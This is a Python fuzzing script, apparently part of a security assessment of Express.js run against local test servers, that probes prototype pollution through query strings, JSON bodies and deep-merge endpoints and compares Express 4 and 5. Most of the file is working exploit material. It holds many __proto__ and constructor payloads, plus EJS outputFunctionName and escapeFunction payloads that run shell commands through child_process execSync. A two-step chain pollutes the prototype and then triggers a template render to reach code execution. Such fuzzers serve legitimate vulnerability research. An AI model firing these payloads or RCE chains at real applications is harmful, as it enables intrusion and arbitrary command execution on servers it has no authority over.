#!/usr/bin/env python3
"""
Phase 2.2 — Prototype Pollution Fuzzer ⭐ HIGHEST PRIORITY
Express.js Security Assessment — [REDACTED]

Tests prototype pollution via qs (query string), body-parser (JSON body),
and deep merge patterns. Tests both Express 4 and 5.
SCOPE: Framework query/body parsing behavior (qs, body-parser).
"""

import requests
import json
import os
import time
import urllib.parse
from datetime import datetime

TARGETS = {'v5': 'http://127.0.0.1:3000', 'v4': 'http://127.0.0.1:3001'}
EVIDENCE_DIR = '/home/[REDACTED]/Desktop/[REDACTED-PATH]/Express/evidence'

results = {
    'metadata': {
        'phase': '2.2', 'name': 'Prototype Pollution Fuzzer',
        'timestamp': datetime.now().isoformat(),
        'scope': 'Framework query/body parsing — prototype pollution'
    },
    'tests': [], 'findings': [], 'anomalies': [], 'summary': {}
}

test_count = 0
anomaly_count = 0

def log_test(name, version, data, finding=None, anomaly=None):
    global test_count, anomaly_count
    test_count += 1
    entry = {'id': test_count, 'test': name, 'version': version, 'data': data}
    if finding:
        results['findings'].append({'id': len(results['findings'])+1, **finding, 'version': version})
        print(f"  [{test_count:3d}] ⚠ FINDING {name} ({version})")
    elif anomaly:
        anomaly_count += 1
        results['anomalies'].append({'id': anomaly_count, **anomaly, 'version': version})
        print(f"  [{test_count:3d}] ? ANOMALY {name} ({version})")
    else:
        print(f"  [{test_count:3d}] ✓ {name} ({version})")
    results['tests'].append(entry)


def cleanup(base_url):
    """Clean prototype pollution between tests"""
    try:
        requests.post(f'{base_url}/api/cleanup', timeout=5)
    except:
        pass


def check_pollution(base_url):
    """Check if Object.prototype was polluted"""
    try:
        r = requests.get(f'{base_url}/api/config', timeout=5)
        data = r.json()
        status = data.get('prototypeStatus', {})
        polluted_keys = {k: v for k, v in status.items() if v is not None}
        return polluted_keys
    except:
        return {}


def fuzz_query_string_pollution():
    """Test qs module prototype pollution via query string — FRAMEWORK BEHAVIOR"""
    print("\n[*] Fuzzing prototype pollution via query string (qs module)...")

    qs_payloads = [
        # Basic __proto__ payloads
        ('proto_direct', '__proto__[polluted]=true'),
        ('proto_admin', '__proto__[admin]=true'),
        ('proto_isAdmin', '__proto__[isAdmin]=1'),
        ('proto_role', '__proto__[role]=admin'),
        ('proto_nested', '__proto__[__proto__][deep]=true'),

        # Constructor-based
        ('constructor_proto', 'constructor[prototype][polluted]=true'),
        ('constructor_proto_admin', 'constructor[prototype][admin]=true'),

        # Encoded variants
        ('proto_encoded', '%5f%5fproto%5f%5f%5bpolluted%5d=true'),
        ('proto_double_encoded', '%255f%255fproto%255f%255f%255bpolluted%255d=true'),
        ('proto_unicode', '\u005f\u005fproto\u005f\u005f[polluted]=true'),

        # Bracket notation variants
        ('bracket_proto', 'a[__proto__][polluted]=true'),
        ('bracket_constructor', 'a[constructor][prototype][polluted]=true'),
        ('deep_bracket', 'a[b][__proto__][polluted]=true'),

        # Array + proto
        ('array_proto', 'a[0]=1&a[__proto__][polluted]=true'),

        # Object.prototype methods
        ('proto_toString', '__proto__[toString]=evil'),
        ('proto_valueOf', '__proto__[valueOf]=evil'),
        ('proto_hasOwnProperty', '__proto__[hasOwnProperty]=evil'),

        # Special keys for EJS exploitation
        ('proto_outputFunctionName', '__proto__[outputFunctionName]=x;process.mainModule.require("child_process").execSync("id");//'),
        ('proto_escapeFunction', '__proto__[escapeFunction]=1;process.mainModule.require("child_process").execSync("id");//'),
        ('proto_client', '__proto__[client]=1'),
        ('proto_debug', '__proto__[debug]=1'),

        # Null/empty
        ('proto_empty', '__proto__='),
        ('proto_null', '__proto__[polluted]=null'),
        ('proto_zero', '__proto__[polluted]=0'),
        ('proto_array', '__proto__[polluted][]=1'),

        # Edge cases
        ('proto_space', '__proto__ [polluted]=true'),
        ('proto_tab', '__proto__\t[polluted]=true'),
        ('proto_dot', '__proto__.polluted=true'),

        # Large nesting depth
        ('deep_nest_5', 'a[b][c][d][e][__proto__][polluted]=true'),
        ('deep_nest_10', 'a[b][c][d][e][f][g][h][i][j][__proto__][polluted]=true'),
    ]

    for version, base_url in TARGETS.items():
        for test_name, qs in qs_payloads:
            cleanup(base_url)
            try:
                # Send via query string
                r = requests.get(f'{base_url}/api/users?{qs}', timeout=5)
                polluted = check_pollution(base_url)

                finding = None
                anomaly = None

                if polluted:
                    finding = {
                        'title': f'Prototype Pollution via Query String ({test_name})',
                        'severity': 'HIGH',
                        'cwe': 'CWE-1321',
                        'description': f'qs module allowed prototype pollution via query string: {qs[:100]}. '
                                       f'Polluted keys: {json.dumps(polluted)}',
                        'framework_behavior': True,
                        'payload': qs,
                        'polluted_keys': polluted
                    }
                elif r.status_code >= 500:
                    anomaly = {'test': test_name, 'desc': f'Server error {r.status_code} with QS payload'}

                log_test(f'qs_{test_name}', version, {
                    'payload': qs[:200],
                    'status': r.status_code,
                    'pollution_detected': bool(polluted),
                    'polluted_keys': polluted
                }, finding, anomaly)
            except Exception as e:
                log_test(f'qs_{test_name}', version, {'error': str(e)})
            finally:
                cleanup(base_url)


def fuzz_json_body_pollution():
    """Test body-parser prototype pollution via JSON body — FRAMEWORK BEHAVIOR"""
    print("\n[*] Fuzzing prototype pollution via JSON body (body-parser)...")

    json_payloads = [
        # Basic __proto__
        ('proto_direct', {'__proto__': {'polluted': 'true'}}),
        ('proto_admin', {'__proto__': {'admin': True}}),
        ('proto_nested', {'__proto__': {'__proto__': {'deep': True}}}),
        ('proto_multiple', {'__proto__': {'polluted': True, 'admin': True, 'role': 'admin'}}),

        # Constructor-based
        ('constructor_proto', {'constructor': {'prototype': {'polluted': 'true'}}}),
        ('constructor_deep', {'a': {'constructor': {'prototype': {'polluted': 'true'}}}}),

        # Nested object
        ('nested_proto', {'a': {'__proto__': {'polluted': 'true'}}}),
        ('deep_nested_proto', {'a': {'b': {'__proto__': {'polluted': 'true'}}}}),

        # Array + proto
        ('array_proto', [{'__proto__': {'polluted': 'true'}}]),

        # EJS exploitation payloads
        ('ejs_outputFn', {'__proto__': {'outputFunctionName': 'x;process.mainModule.require("child_process").execSync("id")//'}}),
        ('ejs_client', {'__proto__': {'client': True}}),
        ('ejs_escape', {'__proto__': {'escapeFunction': '1;process.mainModule.require("child_process").execSync("id")//'}}),

        # shell/env
        ('proto_shell', {'__proto__': {'shell': '/bin/sh'}}),
        ('proto_env', {'__proto__': {'env': {'EVIL': 'true'}}}),

        # Type confusion
        ('proto_number', {'__proto__': {'polluted': 1}}),
        ('proto_bool', {'__proto__': {'polluted': True}}),
        ('proto_null', {'__proto__': {'polluted': None}}),
        ('proto_object', {'__proto__': {'polluted': {'nested': True}}}),
    ]

    for version, base_url in TARGETS.items():
        for test_name, payload in json_payloads:
            cleanup(base_url)
            try:
                # Test via /api/users POST (Object.assign)
                r = requests.post(f'{base_url}/api/users', json=payload, timeout=5)
                polluted_assign = check_pollution(base_url)
                cleanup(base_url)

                # Test via /api/merge POST (deepMerge — app-level but tests body-parser passthrough)
                r2 = requests.post(f'{base_url}/api/merge', json=payload, timeout=5)
                polluted_merge = check_pollution(base_url)

                finding = None
                anomaly = None

                # Only report if body-parser passed __proto__ through (framework behavior)
                if polluted_assign:
                    finding = {
                        'title': f'body-parser Passes __proto__ to Object.assign ({test_name})',
                        'severity': 'HIGH',
                        'cwe': 'CWE-1321',
                        'description': f'body-parser JSON parser does not filter __proto__ from parsed body. '
                                       f'When app uses Object.assign(), prototype pollution occurs. '
                                       f'Polluted keys: {json.dumps(polluted_assign)}',
                        'framework_behavior': True,
                        'note': 'body-parser passes __proto__ through; Object.assign in app code completes the pollution'
                    }
                elif polluted_merge and not polluted_assign:
                    # deepMerge only — app-level vuln, not framework
                    anomaly = {'test': test_name, 'desc': f'deepMerge pollution only (app-level): {json.dumps(polluted_merge)}'}

                log_test(f'json_{test_name}', version, {
                    'payload': str(payload)[:200],
                    'object_assign_pollution': polluted_assign,
                    'deep_merge_pollution': polluted_merge,
                    'assign_status': r.status_code,
                    'merge_status': r2.status_code
                }, finding, anomaly)
            except Exception as e:
                log_test(f'json_{test_name}', version, {'error': str(e)})
            finally:
                cleanup(base_url)


def fuzz_deep_merge_exploitation():
    """Test deep merge prototype pollution chains — primarily app-level but tests framework passthrough"""
    print("\n[*] Fuzzing deep merge prototype pollution chains...")

    merge_payloads = [
        # Direct __proto__ at various depths
        ('depth_1', {'__proto__': {'polluted': 'depth1'}}),
        ('depth_2', {'a': {'__proto__': {'polluted': 'depth2'}}}),
        ('depth_3', {'a': {'b': {'__proto__': {'polluted': 'depth3'}}}}),

        # Constructor chains
        ('constructor_1', {'constructor': {'prototype': {'polluted': 'constructor1'}}}),

        # Mixed
        ('mixed', {'normal': 'data', '__proto__': {'polluted': 'mixed'}, 'other': 'value'}),

        # Large object with hidden __proto__
        ('hidden_in_large', {f'key{i}': f'val{i}' for i in range(50)}),

        # Overwrite critical methods
        ('overwrite_tostring', {'__proto__': {'toString': 'evil'}}),
        ('overwrite_valueof', {'__proto__': {'valueOf': 'evil'}}),
    ]

    # Add __proto__ to the large object payload
    merge_payloads[5] = ('hidden_in_large', {**{f'key{i}': f'val{i}' for i in range(50)}, '__proto__': {'polluted': 'hidden'}})

    for version, base_url in TARGETS.items():
        for test_name, payload in merge_payloads:
            cleanup(base_url)
            try:
                r = requests.post(f'{base_url}/api/merge', json=payload, timeout=5)
                resp = r.json() if r.status_code == 200 else {}
                polluted = check_pollution(base_url)

                # Check proto status from merge response directly
                proto_check = resp.get('protoCheck', {})
                inline_polluted = {k: v for k, v in proto_check.items() if v is not None}

                log_test(f'merge_{test_name}', version, {
                    'status': r.status_code,
                    'inline_pollution': inline_polluted,
                    'global_pollution': polluted
                }, anomaly={'test': test_name, 'desc': f'Deep merge pollution: {json.dumps(inline_polluted)}'} if inline_polluted else None)
            except Exception as e:
                log_test(f'merge_{test_name}', version, {'error': str(e)})
            finally:
                cleanup(base_url)


def fuzz_proto_to_rce():
    """Test prototype pollution → RCE via EJS (framework dependency behavior)"""
    print("\n[*] Testing prototype pollution → RCE chains via EJS...")

    rce_chains = [
        # EJS outputFunctionName pollution → RCE
        {
            'name': 'ejs_outputFunctionName_rce',
            'pollute_payload': {'__proto__': {'outputFunctionName': 'x;return global.process.mainModule.constructor._resolveFilename("os")//'}},
            'trigger_url': '/render-ejs-safe?name=test',
            'description': 'Pollute outputFunctionName → trigger EJS render → code execution'
        },
        # EJS client property
        {
            'name': 'ejs_client_true',
            'pollute_payload': {'__proto__': {'client': True}},
            'trigger_url': '/render-ejs-safe?name=test',
            'description': 'Pollute client=true to change EJS compilation behavior'
        },
        # EJS debug/compileDebug
        {
            'name': 'ejs_debug',
            'pollute_payload': {'__proto__': {'compileDebug': True, 'debug': True}},
            'trigger_url': '/render-ejs-safe?name=test',
            'description': 'Pollute debug/compileDebug to expose template source'
        },
    ]

    for version, base_url in TARGETS.items():
        for chain in rce_chains:
            cleanup(base_url)
            try:
                # Step 1: Pollute via deep merge
                r1 = requests.post(f'{base_url}/api/merge', json=chain['pollute_payload'], timeout=5)
                polluted = check_pollution(base_url)

                # Step 2: Trigger EJS render
                r2 = requests.get(f'{base_url}{chain["trigger_url"]}', timeout=5)

                finding = None
                anomaly = None

                # Check for RCE indicators
                body = r2.text
                if 'uid=' in body or 'root' in body or 'process' in body:
                    finding = {
                        'title': f'Prototype Pollution → RCE via EJS ({chain["name"]})',
                        'severity': 'CRITICAL',
                        'cwe': 'CWE-1321 / CWE-94',
                        'description': f'{chain["description"]}. Response contained RCE indicators.',
                        'framework_behavior': True,
                        'note': 'EJS template engine executes polluted prototype properties during render'
                    }
                elif polluted:
                    anomaly = {'test': chain['name'],
                               'desc': f'Pollution successful but no RCE: polluted={json.dumps(polluted)}, trigger_status={r2.status_code}'}

                log_test(f'rce_{chain["name"]}', version, {
                    'pollution_status': r1.status_code,
                    'polluted_keys': polluted,
                    'trigger_status': r2.status_code,
                    'trigger_response': body[:500],
                    'rce_indicators': any(x in body for x in ['uid=', 'root', 'process.mainModule'])
                }, finding, anomaly)
            except Exception as e:
                log_test(f'rce_{chain["name"]}', version, {'error': str(e)})
            finally:
                cleanup(base_url)


def fuzz_v4_vs_v5_comparison():
    """Compare qs and body-parser behavior between v4 and v5"""
    print("\n[*] Comparing v4 vs v5 prototype pollution handling...")

    # Key payloads to test on both versions
    comparison_payloads = [
        ('qs_proto_basic', 'query', '__proto__[polluted]=compare'),
        ('qs_constructor', 'query', 'constructor[prototype][polluted]=compare'),
        ('json_proto_basic', 'body', json.dumps({'__proto__': {'polluted': 'compare'}})),
        ('json_constructor', 'body', json.dumps({'constructor': {'prototype': {'polluted': 'compare'}}})),
    ]

    v4_results_cmp = {}
    v5_results_cmp = {}

    for test_name, via, payload in comparison_payloads:
        for version, base_url in TARGETS.items():
            cleanup(base_url)
            try:
                if via == 'query':
                    r = requests.get(f'{base_url}/api/users?{payload}', timeout=5)
                else:
                    r = requests.post(f'{base_url}/api/merge', data=payload,
                                      headers={'Content-Type': 'application/json'}, timeout=5)

                polluted = check_pollution(base_url)
                result = {'polluted': bool(polluted), 'keys': polluted, 'status': r.status_code}

                if version == 'v4':
                    v4_results_cmp[test_name] = result
                else:
                    v5_results_cmp[test_name] = result

                log_test(f'compare_{test_name}', version, result)
            except Exception as e:
                log_test(f'compare_{test_name}', version, {'error': str(e)})
            finally:
                cleanup(base_url)

    # Log version differences
    for test_name in set(list(v4_results_cmp.keys()) + list(v5_results_cmp.keys())):
        v4r = v4_results_cmp.get(test_name, {})
        v5r = v5_results_cmp.get(test_name, {})
        if v4r.get('polluted') != v5r.get('polluted'):
            results['findings'].append({
                'id': len(results['findings']) + 1,
                'title': f'v4/v5 Difference: {test_name} — v4={v4r.get("polluted")}, v5={v5r.get("polluted")}',
                'severity': 'MEDIUM',
                'cwe': 'CWE-1321',
                'description': f'Prototype pollution behavior differs: v4 polluted={v4r.get("polluted")}, v5 polluted={v5r.get("polluted")}',
                'framework_behavior': True,
                'version': 'comparison'
            })
            print(f"  [***] VERSION DIFF: {test_name}: v4={v4r.get('polluted')}, v5={v5r.get('polluted')}")


def main():
    print("=" * 70)
    print("Phase 2.2 — Prototype Pollution Fuzzer ⭐ HIGHEST PRIORITY")
    print("Express.js Security Assessment — qs / body-parser / deep merge")
    print("=" * 70)

    # Ensure test data is seeded
    for base_url in TARGETS.values():
        requests.get(f'{base_url}/seed', timeout=5)

    fuzz_query_string_pollution()
    fuzz_json_body_pollution()
    fuzz_deep_merge_exploitation()
    fuzz_proto_to_rce()
    fuzz_v4_vs_v5_comparison()

    # Final cleanup
    for base_url in TARGETS.values():
        cleanup(base_url)

    results['summary'] = {
        'total_tests': test_count,
        'findings_count': len(results['findings']),
        'anomalies_count': anomaly_count,
        'findings_by_severity': {}
    }
    for f in results['findings']:
        sev = f.get('severity', 'UNKNOWN')
        results['summary']['findings_by_severity'][sev] = \
            results['summary']['findings_by_severity'].get(sev, 0) + 1

    out_file = os.path.join(EVIDENCE_DIR, 'prototype_pollution_results.json')
    with open(out_file, 'w') as f:
        json.dump(results, f, indent=2, default=str)

    print(f"\n{'=' * 70}")
    print(f"Prototype pollution fuzzer complete: {test_count} tests, {len(results['findings'])} findings, {anomaly_count} anomalies")
    for sev, count in results['summary']['findings_by_severity'].items():
        print(f"  {sev}: {count}")
    print(f"Evidence: {out_file}")
    print(f"{'=' * 70}")


if __name__ == '__main__':
    main()
